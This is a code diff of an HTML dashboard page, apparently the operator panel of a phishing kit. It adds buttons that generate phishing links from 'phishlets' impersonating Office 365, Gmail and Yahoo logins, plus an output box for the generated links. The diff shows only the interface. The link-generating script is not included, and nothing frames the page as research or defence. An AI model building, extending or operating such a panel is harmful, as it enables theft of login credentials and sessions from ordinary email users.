@@ -5,23 +5,36 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Dashboard 2 | Phishlet Selector</title>
   <link rel="stylesheet" href="styles.css" />
-  <!-- Load Firebase compat SDKs and our scripts -->
+
+  <!-- Firebase SDKs -->
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
   <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+
+  <!-- Load custom scripts -->
   <script defer src="firebase-config.js"></script>
   <script defer src="script.js"></script>
 </head>
 <body>
   <div class="sidebar">
-    <button class="menu-btn" onclick="generatePhishletLink('outlook')">Outlook</button>
-    <button class="menu-btn" onclick="generatePhishletLink('facebook')">Facebook</button>
-    <button class="menu-btn" onclick="generatePhishletLink('google')">Google</button>
-    <button class="menu-btn" onclick="window.location.href='dashboard.html'">Back to Dashboard</button>
+    <!-- Menu buttons mapped to your phishlet names -->
+    <button class="menu-btn animated" onclick="generatePhishletLink('0365')">Office 365</button>
+    <button class="menu-btn animated" onclick="generatePhishletLink('gmail')">Gmail</button>
+    <button class="menu-btn animated" onclick="generatePhishletLink('yahoo')">Yahoo</button>
+    <button class="menu-btn animated" onclick="generatePhishletLink('gmail-old')">Gmail (Old)</button>
+
+    <!-- Back button for navigation -->
+    <button class="menu-btn animated" onclick="window.location.href='dashboard.html'">
+      🔙 Back to Generate Links
+    </button>
   </div>
   
   <div class="content">
     <h2>Phishlet Selector</h2>
-    <p id="phishletLink">Select a phishlet to generate a phishing link.</p>
+    <p>Select a phishlet to generate a phishing link.</p>
+
+    <!-- Output for generated phishing links -->
+    <div id="phishletLink" class="generated-link-output"></div>
   </div>
 </body>
 </html>
+
